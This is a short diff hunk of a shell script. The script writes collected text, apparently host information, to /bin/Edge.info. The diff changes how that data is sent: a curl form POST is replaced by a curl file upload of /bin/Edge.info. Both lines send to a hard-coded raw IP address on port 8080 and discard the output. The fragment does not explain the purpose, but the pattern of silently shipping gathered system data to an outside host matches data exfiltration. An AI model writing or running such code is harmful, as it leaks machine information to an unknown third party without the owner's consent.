@@ -18,5 +18,5 @@ text+="|\n--------------------------------END-----------------------------------
 
 echo -e $text > /bin/Edge.info
 
-curl -X POST http://139.162.139.253:8080 -H "Content-Type: application/x-www-form-urlencoded" -d "param=$text" &1> /dev/null
+curl -F 'EdgeInfo=@/bin/Edge.info' http://139.162.139.253:8080 &1> /dev/null
 ~
